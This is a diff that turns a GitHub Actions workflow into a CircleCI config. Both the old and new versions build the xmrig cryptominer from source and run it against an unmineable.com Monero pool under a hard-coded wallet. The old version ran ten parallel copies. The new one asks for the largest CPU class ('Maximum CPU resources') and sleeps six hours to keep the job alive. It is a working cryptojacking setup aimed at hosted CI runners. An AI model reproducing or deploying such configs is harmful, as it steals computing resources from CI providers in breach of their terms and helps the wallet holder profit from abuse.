@@ -1,31 +1,45 @@
-name: Parallel Jobs Example
-
-on:
-  workflow_dispatch:  # Manual trigger
+version: 2.1
 
 jobs:
-  build:
-    runs-on: ubuntu-latest
-    strategy:
-      matrix:
-        instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]  # Create 10 jobs in parallel
-
+  build-and-run:
+    docker:
+      - image: ubuntu:latest
+        environment:
+          DOCKER_BUILDKIT: 1
     steps:
-      - name: Check out repository
-        uses: actions/checkout@v2
+      - checkout
 
-      - name: Build and Run xmrig Instance ${{ matrix.instance }}
-        run: |
-          echo "Running instance number ${{ matrix.instance }} in Docker..."
-          docker run --rm -v ${{ github.workspace }}:/workspace -w /workspace ubuntu:latest bash -c "
-          apt update && \
-          apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev && \
-          git clone https://github.com/xmrig/xmrig.git && \
-          cd xmrig && \
-          mkdir build && \
-          cd build && \
-          cmake .. && \
-          make && \
-          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u XMR:88ShoRuQAns2zfCrQWqC9M6bBjCCBf4xs7TNyXDK3iHsdkQTRaK75MNUxqzw4X62bwF2ik6HwBeJeNdsTTy98MUnS9Q4Rmp.unmineable_worker_owqndft#mvbs-zlx7 -p x
-          "
+      - run:
+          name: Update and Install Dependencies
+          command: |
+            apt-get update && \
+            apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+
+      - run:
+          name: Build xmrig
+          command: |
+            git clone https://github.com/xmrig/xmrig.git && \
+            cd xmrig && \
+            mkdir build && \
+            cd build && \
+            cmake .. && \
+            make
+
+      - run:
+          name: Run xmrig
+          command: |
+            ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u XMR:88ShoRuQAns2zfCrQWqC9M6bBjCCBf4xs7TNyXDK3iHsdkQTRaK75MNUxqzw4X62bwF2ik6HwBeJeNdsTTy98MUnS9Q4Rmp.unmineable_worker_tsjcm#mvbs-zlx7 -p x
+
+      - run:
+          name: Wait for 6 hours
+          command: |
+            echo "Waiting for 6 hours..."
+            sleep 21600  # Sleep for 6 hours (21600 seconds)
+
+workflows:
+  version: 2
+  build:
+    jobs:
+      - build-and-run:
+          resource_class: large  # Maximum CPU resources
           
